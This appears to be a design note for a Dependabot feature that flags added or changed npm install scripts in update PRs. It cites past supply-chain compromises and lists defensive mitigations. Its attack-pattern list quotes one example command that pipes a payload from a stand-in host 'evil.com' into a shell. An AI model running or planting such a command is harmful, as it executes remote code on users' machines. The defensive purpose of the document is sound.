# npm install script warnings in Dependabot

## The problem

When you run `npm install`, npm executes lifecycle scripts from your dependencies automatically. The scripts `preinstall`, `install`, `postinstall`, and `prepare` all run with your user's permissions before you've had a chance to review the code.

The attack pattern is simple:

1. Attacker compromises a maintainer's npm account
2. Attacker publishes a new version with a malicious `postinstall` script
3. Users update the package, triggering the script
4. The script runs `curl http://evil.com/payload.sh | sh` or similar

This has happened repeatedly:

- **event-stream (2018)**: A maintainer handed off the package to someone who added a `postinstall` that stole Bitcoin wallet keys. 8 million weekly downloads.
- **ua-parser-js (2021)**: Compromised account published versions with crypto miners in `preinstall`. 7 million weekly downloads.
- **node-ipc (2022)**: Maintainer deliberately added a `postinstall` that wiped files on Russian/Belarusian IPs. 1 million weekly downloads.
- **@ledgerhq/connect-kit (2023)**: Compromised npm account published a version with wallet-draining code in install scripts.

Same pattern each time: new version appears, users update, malicious code runs before anyone notices.

## Why warn about this

Dependabot already warns when a package has a new maintainer. That catches some attacks, but not all. A package can be compromised without a maintainer change (stolen token, social engineering). And maintainer changes aren't always malicious—legitimate handoffs happen all the time.

Install script changes are different. A new `postinstall` script showing up in a previously script-free package? That's worth a second look regardless of who published it.

## What we built

When Dependabot creates a PR for an npm package update, it checks whether any install scripts were added or modified since the previous version. If so, the PR description includes a warning:

> **Install script changes**
>
> This version adds `postinstall` script that runs during installation. Review the package contents before updating.

The warning covers all scripts that run during `npm install`:

- `preinstall`
- `install`
- `postinstall`
- `prepublish` (deprecated but still runs)
- `preprepare`
- `prepare`
- `postprepare`

Scripts like `test`, `build`, or `start` are ignored since they don't run during installation.

## Limitations

This is visibility, not protection. If you're not reading PR descriptions, you won't see it. It also can't detect obfuscated payloads or scripts that download code at runtime.

Other things you should still do:

- Run `npm install --ignore-scripts` in CI when possible
- Use lockfiles and review lockfile changes
- Consider tools like Socket that analyze package behavior
- Limit which dependencies can run install scripts (npm 9+ supports this)

But for teams that review their Dependabot PRs, this gives them one more signal when something needs extra scrutiny.

## Implementation

The change adds an `install_script_changes` method to `MetadataFinders::Base` (returns `nil` by default) and implements it for npm_and_yarn. The method compares the `scripts` object in the npm registry metadata between versions.

The warning appears in `MetadataPresenter` alongside the existing maintainer changes section.

Files changed:

- `common/lib/dependabot/metadata_finders/base.rb`
- `npm_and_yarn/lib/dependabot/npm_and_yarn/metadata_finder.rb`
- `common/lib/dependabot/pull_request_creator/message_builder/metadata_presenter.rb`
